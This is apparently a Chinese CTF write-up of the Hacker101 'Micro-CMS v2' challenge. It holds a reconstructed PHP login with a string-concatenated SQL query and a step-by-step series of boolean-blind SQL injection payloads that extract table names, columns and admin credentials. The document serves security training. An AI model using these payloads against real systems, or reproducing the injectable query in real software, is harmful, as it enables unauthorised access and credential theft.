---
description: hacker101
---

# Micro-CMS v2

升级了,编辑文档都需要登录了

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

1. 尝试修改请求的方法,获得了一个flag

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>



<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

使&#x7528;_<mark style="color:red;background-color:$warning;">**`'`**</mark>_ 后,服务器发生错误,说明存在sql注入

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

尝试<mark style="color:red;">**`' OR '1'='1'#`**</mark> 万能登录,提示密码无效,我们现在的查询可能是这样的

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

为什么提示密码无效呢? 它可能提取了密码和我们的请求进行了对比

```php
// Some 

// 步骤1：先查询用户名是否存在（单独校验用户名）
$username = $_POST['username'];
$sql_check_user = "SELECT * FROM users WHERE username='$username'"; 
$result_user = mysqli_query($conn, $sql_check_user);

// 步骤2：判断用户名是否存在
if (mysqli_num_rows($result_user) == 0) { 
    // 用户名不存在 → 提示“无效的用户名”（Unknown user）
    echo "Unknown user"; 
    exit;
}

// 步骤3：若用户名存在，再获取该用户的密码并校验
$row = mysqli_fetch_assoc($result_user);
$password_input = $_POST['password'];
if ($row['password'] == $password_input) { 
    echo "登录成功";
} else {
    echo "密码错误";
}
```

可是我们不知道不知道用户名,也不直到密码到底是多少,但是如果查出了结果,它就会提示 <mark style="color:red;">密码错误  ,这是一个基于错误的sql注入</mark> 我们可以通过这个错误,来枚举数据库的用户名和密码

<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

如果出现 Invalid password 说明查询正确,但是它比较了我们post传过去的密码,所以验证没有成功

如果没有出现这个提示,说明没有查询到任何东西. 这就是 <mark style="color:red;">**基于bool的盲注**</mark>

首先我们确保了username绝对是查不出数据的,这样,我们应该使用<mark style="color:red;">**`OR`**</mark><mark style="color:red;">**&#x20;**</mark><mark style="color:red;">**,**</mark>  这样我们 只要OR后面结果为真,就会返回无效密码,只要结果为假,就会返回 未知用户名

首先获得数据库的名词,  使用手动遍历也行,通过二分查找,

`username='OR+ASCII(SUBSTRING(DATABASE(),2,1))>101#&password=` &#x20;

使用ascii 主要是为了防止大小写不区分,比如DATABASE()="User" 和DATABASE()="user" 它都能匹配上,没有区分大小i写,这样就可以炸出数据库名

<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption><p>burp爆破</p></figcaption></figure>

得到数据库名  `level2`  ,,接着 我想直到 这个数据库中 有几个表

`username='OR+(SELECT+COUNT(*)+FROM+information_schema.tables+WHERE+table_schema%3ddatabase())=2#&password=` 使用子查询&#x20;

得到数据库level2有两个表

通过查询,得到第一个表名字为5个字符,第二个表名为6个字符

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>第一个表名字符数</p></figcaption></figure>



<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption><p>第二个表名字符数</p></figcaption></figure>

通过不断的手工枚举,`username='OR+ASCII(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3dDATABASE()+LIMIT+0,1),5,1))=115#&password=`  我得到第一个表名为`pages`&#x20;

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>pages表</p></figcaption></figure>

得到第二个表`admins`&#x20;

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

查询admins 表中有3列

`username='OR+(SELECT+COUNT(*)+FROM+information_schema.columns+WHERE+table_name%3d'admins')=3%23&password=`&#x20;

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

查询admins表的第一列的名字字符数,得到2个

`username='OR+(SELECT+LENGTH(column_name)+FROM+information_schema.columns+WHERE+table_name='admins'+LIMIT+0,1)=2%23&password=username='OR+(SELECT+LENGTH(column_name)+FROM+information_schema.columns+WHERE+table_name='admins'+LIMIT+0,1)=2%23&password=`&#x20;

第二列 字符数为8

第三列 字符数为8

这不禁让我猜测

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

{% columns %}
{% column width="25%" %}
id
{% endcolumn %}

{% column width="33.333333333333336%" %}
username
{% endcolumn %}

{% column width="41.66666666666666%" %}
password
{% endcolumn %}
{% endcolumns %}

可能是这样的,我们试一下,确实是这样的,大胆猜测,小心求证,这节省了我们很多的时间

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>



现在开始猜测用户名,还是从个数开始 ,可知用户只有1个

`username='OR+(SELECT+COUNT(username)+from+admins)=1%23&password=`

<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

现在猜测用户名的长度为6,

`username='OR+(SELECT+username+from+admins+LIMIT+0,1)='admins'%23&password=`&#x20;

会不会是admins 呢

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

不是admins

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

再次进行枚举用户名,得到用户名: <mark style="color:red;">`latoya`</mark>

`username='OR+ASCII(SUBSTRING((SELECT+username+from+admins+LIMIT+0,1),6,1))=97%23&password=`

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

猜测用户名的密码长度,得到密码长度为 <mark style="color:red;">`6`</mark>

`username='OR+(SELECT+LENGTH(password)+from+admins)=6%23&password=`&#x20;

<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>



猜测密码,为<mark style="color:red;">`juliet`</mark> &#x20;

`username='OR+ASCII(SUBSTRING((SELECT+password+from+admins+LIMIT+0,1),1,1))=106%23&password=`

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

